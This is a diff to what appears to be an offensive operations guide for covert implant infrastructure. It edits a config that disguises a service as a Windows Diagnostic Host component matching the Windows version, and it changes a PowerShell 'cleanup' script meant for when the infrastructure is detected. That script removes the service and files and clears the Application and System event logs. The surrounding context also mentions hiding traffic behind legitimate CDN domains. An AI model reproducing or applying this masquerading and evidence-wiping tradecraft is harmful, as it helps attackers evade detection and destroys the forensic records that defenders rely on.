@@ -124,7 +124,7 @@ Route traffic through legitimate CDN domains:
 {
   "serviceName": "WinDiagnosticHost",
   "displayName": "Windows Diagnostic Host Service",
-  "installRoot": "C:/Windows/System32/DiagnosticHost",
+  "installRoot": "C:/ProgramData/DiagnosticHost",
   "versionInfo": {
     "fileVersion": "10.0.19041.0"  // Match Windows version
   }
@@ -264,7 +264,7 @@ If your infrastructure is detected:
 ```powershell
 # Client-side cleanup script
 Remove-Service "WinDiagnosticHost" -Force
-Remove-Item -Recurse -Force "C:\Windows\System32\DiagnosticHost\"
+Remove-Item -Recurse -Force "C:\\ProgramData\\DiagnosticHost\"
 Clear-EventLog -LogName Application
 Clear-EventLog -LogName System
 ```
